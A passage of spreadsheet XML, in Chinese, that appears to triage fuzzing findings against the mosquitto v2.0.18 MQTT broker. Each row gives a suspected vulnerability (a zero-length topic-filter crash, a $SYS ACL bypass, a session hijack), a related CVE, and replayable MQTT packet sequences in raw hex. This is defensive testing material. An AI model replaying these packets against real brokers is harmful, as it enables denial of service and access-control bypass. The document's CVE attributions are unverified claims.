raw_header=37373737373737373737373737373737\u000aMsg[23]: PUBLISH Topic='?' QoS=3 retain=True payload='' | raw_header=37373737373737373737373737373737\u000aMsg[24]: PUBLISH Topic='?' QoS=3 retain=True payload='' | raw_header=37373737373737373737373737373737\u000aMsg[25]: PUBLISH Topic='?' QoS=3 retain=True payload='' | raw_header=37373737373737373737373737373737\u000a(尾部681B): 3737373737373737373737373737373737373737373737373737373737373737373737373737373737373737103737373737</f>
        <v/>
      </c>
      <c r="F5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9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94" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(敏感信息泄露)</t>
        </is>
      </c>
      <c r="J59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59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595">
      <c r="A595" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000009,sev:4,cat:0344</t>
        </is>
      </c>
      <c r="B595" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C595" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D5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595" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:0344 ===\u000a大小: 717B (报告+请求数据)\u000a请求数据: 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MQTT请求序列(26B原始二进制) ---\u000aMsg[1]: (不完整,26B) raw=8228000c0000010000006315642f652f662f672f682f692f6a00\u000a(尾部26B): 8228000c0000010000006315642f652f662f672f682f692f6a00</f>
        <v/>
      </c>
      <c r="F5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5" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J5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9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6">
      <c r="A596" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000009,sev:4,cat:0345</t>
        </is>
      </c>
      <c r="B596" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C596" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D5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DATA提取出来(3559B)\u000a4.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Sev4\u000a- 违规类别代码: 0x0345\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E596" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:0345 ===\u000a大小: 5760B (报告+请求数据)\u000a请求数据: 3559B\u000a\u000a---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MQTT请求序列(3559B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=0 Topics=[''(零长度!QoS=3)] | raw_header=8212000000007f7465357000c2110082\u000aMsg[2]: PUBREL PacketID=28672 | raw_header=656d7000a2110002000d73656eff0072\u000aMsg[3]: PUBREL PacketID=26728 | raw_header=68686868686868686868686868686868\u000aMsg[4]: PUBREL PacketID=26728 | raw_header=68686868686868686868686868686868\u000aMsg[5]: PUBREL PacketID=26728 | raw_header=68686868686868686868686868686868\u000aMsg[6]: PUBREL PacketID=26728 | raw_header=68686868686868686868686868686868\u000aMsg[7]: PUBREL PacketID=25700 | raw_header=64646464646464646464646464646464\u000aMsg[8]: PUBREL PacketID=25700 | raw_header=64646464646464646464646464646464\u000aMsg[9]: PUBREL PacketID=26728 | raw_header=68686868686868686868686868686868\u000aMsg[10]: PUBREL PacketID=26728 | raw_header=68686868686868686868686868686868\u000aMsg[11]: PUBREL PacketID=26728 | raw_header=68686868686868686868686868686868\u000aMsg[12]: PUBREL PacketID=26728 | raw_header=68686868686868686868686868686868\u000aMsg[13]: PUBREL PacketID=26728 | raw_header=68686868686868686868686868686868\u000aMsg[14]: PUBREL PacketID=26728 | raw_header=68686868686868686868686868686868\u000aMsg[15]: PUBREL PacketID=26728 | raw_header=68686868686868686868686868686868\u000aMsg[16]: PUBREL PacketID=26728 | raw_header=68686868686868686868686868686868\u000aMsg[17]: PUBREL PacketID=26728 | raw_header=686868686868686868686868687fffff\u000aMsg[18]: PUBREL PacketID=162 | raw_header=6d7000a2110002000d73656e706f722f\u000aMsg[19]: PUBREL PacketID=26728 | raw_header=68686868686868686868686868686868\u000aMsg[20]: PUBREL PacketID=26728 | raw_header=68686868686868686868686868686868\u000aMsg[21]: PUBREL PacketID=26728 | raw_header=68686868686868686868686868686868\u000aMsg[22]: PUBREL PacketID=26728 | raw_header=68686868686868686868686868686868\u000aMsg[23]: PUBREL PacketID=26728 | raw_header=68686868686868686868686868686868\u000aMsg[24]: TYPE0  | raw_header=01686868686868686868686868686868\u000aMsg[25]: PUBREL PacketID=26728 | raw_header=68686868686868686868686868686868\u000a(尾部990B): 6868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868686868</f>
        <v/>
      </c>
      <c r="F5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6" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J59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9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7">
      <c r="A597" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000009,sev:4,cat:03c4</t>
        </is>
      </c>
      <c r="B597" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C597" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D5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DATA提取出来(353B)\u000a4.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597" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:03c4 ===\u000a大小: 1842B (报告+请求数据)\u000a请求数据: 353B\u000a\u000a---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MQTT请求序列(353B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v3 ClientID='\x7fuzz_c3'(7B) clean_session=True keepalive=74s Will=YES [自动清理会话] | raw_header=101300044d51545403ef004a00077f75\u000aMsg[2]: SUBSCRIBE PacketID=1 Topics=['test/#'(QoS=2)] | raw_header=820b00010006746573742f2302\u000aMsg[3]: PUBLISH Topic='MQTT' QoS=2 retain=False payload='\x04\x00\x00&lt;\x00\u000dpersistent_01' | raw_header=341900044d5154540400003c000d7065\u000aMsg[4]: SUBSCRIBE PacketID=1 Topics=['test/#'(QoS=1)] | raw_header=820b00010006746573742f2301\u000aMsg[5]: PUBLISH Topic='tennnnns1' QoS=1 retain=False payload='lo14\x13\x00\u0009t' | raw_header=3213000974656e6e6e6e6e73316c6f31\u000aMsg[6]: PUBREC PacketID=20039 | raw_header=50434e4752452f74656d70000a74e400\u000aMsg[7]: SUBSCRIBE PacketID=1328 Topics=['$share/g3/home/+/temperature'(QoS=0), ''(零长度!QoS=3)] | raw_header=825b0530001c2473686172652f67332f\u000aMsg[8]: PUBLISH Topic='$share/grp2/sensor/#' QoS=1 retain=True payload='ð\x16\x19\x14' | raw_header=331a00142473686172652f677270322f\u000aMsg[9]: CONNECT  | raw_header=1500\u000aMsg[10]: (不完整,66B) raw=05504c41494e160009ba29f8052f7728da620531013c3017001173656e736f722f726f6f6d312f74\u000a(尾部66B): 05504c41494e160009ba29f8052f7728da620531013c3017001173656e736f722f726f6f6d312f74656d7032322e35321100</f>
        <v/>
      </c>
      <c r="F5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7" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J59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9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8">
      <c r="A598" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000009,sev:4,cat:03c5</t>
        </is>
      </c>
      <c r="B598" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C598" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D5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DATA提取出来(583B)\u000a4.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0x03c5\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E598" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:03c5 ===\u000a大小: 3581B (报告+请求数据)\u000a请求数据: 583B\u000a\u000a---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MQTT请求序列(583B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=59487 Topics=[''(零长度!QoS=0)] | raw_header=8212e85f000040656e736f722f2b2f74\u000aMsg[2]: PUBLISH Topic='?' QoS=2 retain=False payload='' | raw_header=3c353535353535353535353535353535\u000aMsg[3]: PUBLISH Topic='?' QoS=3 retain=False payload='' | raw_header=36353535353535353535353535353535\u000aMsg[4]: PUBLISH Topic='?' QoS=2 retain=True payload='' | raw_header=35353535353535353535353535353535\u000aMsg[5]: PUBLISH Topic='?' QoS=2 retain=True payload='' | raw_header=35353535353535353535353535353535\u000aMsg[6]: AUTH  | raw_header=f000\u000aMsg[7]: PUBLISH Topic='?' QoS=2 retain=True payload='' | raw_header=35353535353535353535353535353535\u000aMsg[8]: PUBLISH Topic='?' QoS=2 retain=True payload='' | raw_header=35353535353535353535353535353535\u000aMsg[9]: PUBLISH Topic='?' QoS=2 retain=True payload='' | raw_header=35353535353535353535353535353535\u000aMsg[10]: PUBLISH Topic='?' QoS=2 retain=True payload='' | raw_header=35353535353535353535353535353535\u000aMsg[11]: (不完整,121B) raw=ff7f3535353535353535355535353535353535353535353535353535353535353535353535e5656e\u000a(尾部121B): ff7f3535353535353535355535353535353535353535353535353535353535353535353535e5656e736f722f2b2f74656d70</f>
        <v/>
      </c>
      <c r="F5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8" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J5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59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99">
      <c r="A599" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_8.tar.gz/replayable-violations/id:000009,sev:4,cat:03c7</t>
        </is>
      </c>
      <c r="B599" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C599" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D5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将种子文件(id:000009,sev:4,cat:03c7)中的REQUEST DATA提取出来(298B)\u000a4.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0x03c7\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E599" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:03c7 ===\u000a大小: 1525B (报告+请求数据)\u000a请求数据: 298B\u000a\u000a---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MQTT请求序列(298B原始二进制) ---\u000aMsg[1]: CONNECT Proto=M\x00\x00T v65 ClientID=''(117B) clean_session=False keepalive=1101s [持久会话] | raw_header=101300044d0000544100044d00007574\u000aMsg[2]: SUBSCRIBE PacketID=2 Topics=[''(零长度!QoS=1)] | raw_header=820f00020000016573742f746f706963\u000aMsg[3]: PUBLISH Topic='$SYS/broker/uptime' QoS=2 retain=False payload='\x00\x03"\x01\x02\x03' | raw_header=341a0012245359532f62726f6b65722f\u000aMsg[4]: PINGREQ  | raw_header=c000\u000aMsg[5]: SUBSCRIBE PacketID=256 Topics=['+/data'(QoS=2), 't'(QoS=1), '$\x00\x00\x00de/grp2/s\x00\x00ÿÿr/#'(QoS=2)] | raw_header=8226010000062b2f6461746102000174\u000aMsg[6]: PUBLISH Topic='home/+/temperature' QoS=0 retain=True payload='g9 ÀXr]±/uptime\x00\x03"\x01\x02\x03\x17W\x8f\u000a\x10¸èóÈÈT' | raw_header=39340012686f6d652f2b2f74656d7065\u000aMsg[7]: PUBLISH  | raw_header=3800\u000aMsg[8]: TYPE0  | raw_header=000402007574\u000aMsg[9]: PUBREC PacketID=30074 | raw_header=5f66757a7a820f00020000016573742f\u000aMsg[10]: (不完整,24B) raw=656d70657261747572656739a0c058725db12f757074695b\u000a(尾部24B): 656d70657261747572656739a0c058725db12f757074695b</f>
        <v/>
      </c>
      <c r="F5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9" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J5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59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0">
      <c r="A600" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000002,sev:4,cat:0040</t>
        </is>
      </c>
      <c r="B600" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C600" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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将种子文件(id:000002,sev:4,cat:0040)中的REQUEST DATA提取出来(159B)\u000a4.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0" s="2">
        <f>== 种子标识: id:000002,sev:4,cat:0040 ===\u000a大小: 536B (报告+请求数据)\u000a请求数据: 159B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev4】MQTT: SUBSCRIBE with zero-length topic filter (broker crash risk) (Cat=0x0040 Hash=0x2b06a199 CVE=CVE-2019-5432)\u000a\u000a--- MQTT请求序列(159B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID='af}net_c0'(9B) clean_session=True keepalive=60s [自动清理会话] | raw_header=101500044d5154540402003c00096166\u000aMsg[2]: SUBSCRIBE PacketID=1 Topics=[''(零长度!QoS=0), ''(零长度!QoS=0)] | raw_header=820b00010000040000e02f3030\u000aMsg[3]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=30303030303030303030303030303030\u000aMsg[4]: PUBREL PacketID=12136 | raw_header=67332f686f6d652f2b2f74656d706572\u000aMsg[5]: TYPE0  | raw_header=00020802\u000aMsg[6]: (不完整,16B) raw=23a44e8a23dc5f12e3303030303024ff\u000a(尾部16B): 23a44e8a23dc5f12e3303030303024ff</f>
        <v/>
      </c>
      <c r="F6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0" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J6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0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01">
      <c r="A601" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000002,sev:4,cat:00c0</t>
        </is>
      </c>
      <c r="B601" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C601" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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将种子文件(id:000002,sev:4,cat:00c0)中的REQUEST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01" s="2">
        <f>== 种子标识: id:000002,sev:4,cat:00c0 ===\u000a大小: 742B (报告+请求数据)\u000a请求数据: 178B\u000a\u000a---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MQTT请求序列(178B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID='aflnet_c0'(9B) clean_session=True keepalive=60s [自动清理会话] | raw_header=101500044d5154540402003c00096166\u000aMsg[2]: SUBSCRIBE PacketID=5 Topics=['test/°'(QoS=0)] | raw_header=820b00050006746573742fb000\u000aMsg[3]: TYPE0  | raw_header=0b00\u000aMsg[4]: SUBSCRIBE PacketID=223 Topics=[''(零长度!QoS=0)] | raw_header=822200df00001c2473686172652f6733\u000aMsg[5]: PUBLISH Topic='very/deep/topic/level1/level2/level3/level4' QoS=0 retain=True payload_len=57B | raw_header=3966002b766572792f646565702f746f</f>
        <v/>
      </c>
      <c r="F6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1" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J6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0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02">
      <c r="A602" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000004,sev:3,cat:0082</t>
        </is>
      </c>
      <c r="B602" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C602" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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将种子文件(id:000004,sev:3,cat:0082)中的REQUEST DATA提取出来(195B)\u000a4.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0x0082\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E602" s="2">
        <f>== 种子标识: id:000004,sev:3,cat:0082 ===\u000a大小: 894B (报告+请求数据)\u000a请求数据: 195B\u000a\u000a---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CVE=CVE-2023-3592)\u000a\u000a--- MQTT请求序列(195B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v22 ClientID=''(2401B) clean_session=True keepalive=60s [自动清理会话] | raw_header=101500044d5154541602003c00096162\u000aMsg[2]: PUBCOMP  | raw_header=73012f\u000aMsg[3]: CONNACK  | raw_header=2300\u000aMsg[4]: PUBLISH Topic='test/topic' QoS=1 retain=True payload='\x00\x0e' | raw_header=330e000a746573742f746f706963000e\u000aMsg[5]: PUBLISH Topic='$SYS/broker/uptime' QoS=2 retain=False payload_len=106B | raw_header=347e0012245359532f62726f6b65722f\u000aMsg[6]: PUBLISH Topic='$S`S/#' QoS=0 retain=True payload='hello' | raw_header=310d0006245360532f2368656c6c6f\u000aMsg[7]: PUBACK PacketID=17 | raw_header=40020011\u000aMsg[8]: PINGREQ  | raw_header=c000\u000aMsg[9]: DISCONNECT 断开连接 | raw_header=e000</f>
        <v/>
      </c>
      <c r="F6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2" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J6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0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3">
      <c r="A603" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000005,sev:3,cat:0101</t>
        </is>
      </c>
      <c r="B603" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C603" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D6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将种子文件(id:000005,sev:3,cat:0101)中的REQUEST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03" s="2">
        <f>== 种子标识: id:000005,sev:3,cat:0101 ===\u000a大小: 704B (报告+请求数据)\u000a请求数据: 177B\u000a\u000a---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MQTT请求序列(177B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v30 ClientID=''(10B) clean_session=False keepalive=65084s [持久会话] | raw_header=101500044d5154541e01fe3c00000a77\u000aMsg[2]: TYPE0  | raw_header=0b00\u000aMsg[3]: TYPE0  | raw_header=0100\u000aMsg[4]: TYPE0  | raw_header=06746573742f2301340f000674823100\u000aMsg[5]: (不完整,32B) raw=77b94f2388763f391610c4ecf6ef3d6573742f62000a776f726c647f02000a00\u000a(尾部32B): 77b94f2388763f391610c4ecf6ef3d6573742f62000a776f726c647f02000a00</f>
        <v/>
      </c>
      <c r="F6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0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03" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J60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0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04">
      <c r="A604" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000005,sev:4,cat:0040</t>
        </is>
      </c>
      <c r="B604" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C604" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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4" s="2">
        <f>== 种子标识: id:000005,sev:4,cat:0040 ===\u000a大小: 435B (报告+请求数据)\u000a请求数据: 59B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev4】MQTT: SUBSCRIBE with zero-length topic filter (broker crash risk) (Cat=0x0040 Hash=0x2b06a199 CVE=CVE-2019-5432)\u000a\u000a--- MQTT请求序列(59B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v30 ClientID=''(2401B) clean_session=True keepalive=60s [自动清理会话] | raw_header=101500044d5154541e02003c00096162\u000aMsg[2]: SUBSCRIBE PacketID=1 Topics=[''(零长度!QoS=3)] | raw_header=820b000100007f6568742f2301\u000aMsg[3]: PUBLISH Topic='test/b' QoS=2 retain=False payload='\x00\u000acorld' | raw_header=340f0006746573742f62000a636f726c\u000aMsg[4]: PUBREL PacketID=10 | raw_header=6202000a\u000aMsg[5]: DISCONNECT 断开连接 | raw_header=e000</f>
        <v/>
      </c>
      <c r="F6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4" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J6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0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05">
      <c r="A605" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000006,sev:3,cat:0002</t>
        </is>
      </c>
      <c r="B605" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C605" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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05" s="2">
        <f>== 种子标识: id:000006,sev:3,cat:0002 ===\u000a大小: 497B (报告+请求数据)\u000a请求数据: 153B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: PUBLISH to $SYS topic (ACL bypass) (Cat=0x0002 Hash=0x06a9cae1 CVE=N/A)\u000a\u000a--- MQTT请求序列(153B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=340 Topics=['very/deep/topic/level1/level2/level3/level4'(QoS=1), '$share/grp2/sensor/#'(QoS=2)] | raw_header=82470154002b766572792f646565702f\u000aMsg[2]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=2 retain=False payload_len=44B | raw_header=344b001d245359532f62726f6b65722f\u000aMsg[3]: (不完整,3B) raw=00547f\u000a(尾部3B): 00547f</f>
        <v/>
      </c>
      <c r="F6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5" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J6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0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6">
      <c r="A606" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000006,sev:3,cat:0082</t>
        </is>
      </c>
      <c r="B606" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C606" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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DATA提取出来(238B)\u000a4.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06" s="2">
        <f>== 种子标识: id:000006,sev:3,cat:0082 ===\u000a大小: 750B (报告+请求数据)\u000a请求数据: 238B\u000a\u000a---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MQTT请求序列(238B原始二进制) ---\u000aMsg[1]: TYPE0  | raw_header=000100\u000aMsg[2]: TYPE0  | raw_header=004d000003f7ff7f3c000766757a805f\u000aMsg[3]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=2 retain=True payload_len=103B | raw_header=358601001d245359532f62726f6b6572\u000aMsg[4]: (不完整,19B) raw=2f62002c776f726c446202000a7002000ae000\u000a(尾部19B): 2f62002c776f726c446202000a7002000ae000</f>
        <v/>
      </c>
      <c r="F6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6" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J6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0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7">
      <c r="A607" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000006,sev:3,cat:0101</t>
        </is>
      </c>
      <c r="B607" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C607" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D6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DATA提取出来(15B)\u000a4.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07" s="2">
        <f>== 种子标识: id:000006,sev:3,cat:0101 ===\u000a大小: 389B (报告+请求数据)\u000a请求数据: 15B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: Empty ClientID with clean_session=0 (session hijack risk) (Cat=0x0101 Hash=0x13f826d0 CVE=CVE-2014-6116)\u000a\u000a--- MQTT请求序列(15B原始二进制) ---\u000aMsg[1]: (不完整,15B) raw=143c000961666c6e6c113c7b000080\u000a(尾部15B): 143c000961666c6e6c113c7b000080</f>
        <v/>
      </c>
      <c r="F6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0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07" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J60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0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08">
      <c r="A608" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000006,sev:3,cat:0286</t>
        </is>
      </c>
      <c r="B608" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C608" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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将种子文件(id:000006,sev:3,cat:0286)中的REQUEST DATA提取出来(299B)\u000a4.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08" s="2">
        <f>== 种子标识: id:000006,sev:3,cat:0286 ===\u000a大小: 979B (报告+请求数据)\u000a请求数据: 299B\u000a\u000a---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MQTT请求序列(299B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID='aflnetkc0'(9B) clean_session=True keepalive=60s [自动清理会话] | raw_header=101500044d5154540402003c00096166\u000aMsg[2]: SUBSCRIBE PacketID=1 Topics=['test/#'(QoS=0)] | raw_header=820b00010006746573742f2300\u000aMsg[3]: SUBSCRIBE PacketID=1 Topics=[] | raw_header=8249000129260012686f6d652f2b2f74\u000aMsg[4]: PUBLISH Topic='$SYS/broker/version' QoS=2 retain=True payload_len=126B | raw_header=3d93010013245359532f62726f6b6572\u000aMsg[5]: PUBLISH Topic='test/topic' QoS=2 retain=False payload='\x00\x02hello' | raw_header=3413000a746573742f746f7069630002\u000aMsg[6]: PUBREC PacketID=2 | raw_header=50020002\u000aMsg[7]: PUBREL PacketID=2 | raw_header=62020002\u000aMsg[8]: PUBCOMP PacketID=2 | raw_header=70020002\u000aMsg[9]: TYPE0  | raw_header=000200e0\u000aMsg[10]: TYPE0  | raw_header=00</f>
        <v/>
      </c>
      <c r="F6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8" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J6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0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09">
      <c r="A609" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000006,sev:4,cat:0040</t>
        </is>
      </c>
      <c r="B609" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C609" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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9" s="2">
        <f>== 种子标识: id:000006,sev:4,cat:0040 ===\u000a大小: 436B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SUBSCRIBE PacketID=1 Topics=[''(零长度!QoS=0)] | raw_header=820b0001000014543c00096103\u000aMsg[2]: (不完整,47B) raw=6c6e61375f6330820b00010006746573742f23003413000a74656573742f630014646174698e4a00\u000a(尾部47B): 6c6e61375f6330820b00010006746573742f23003413000a74656573742f630014646174698e4a001462fcff13e000</f>
        <v/>
      </c>
      <c r="F6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9" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J6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0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0">
      <c r="A610" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000006,sev:4,cat:0042</t>
        </is>
      </c>
      <c r="B610" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C610" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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将种子文件(id:000006,sev:4,cat:0042)中的REQUEST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10" s="2">
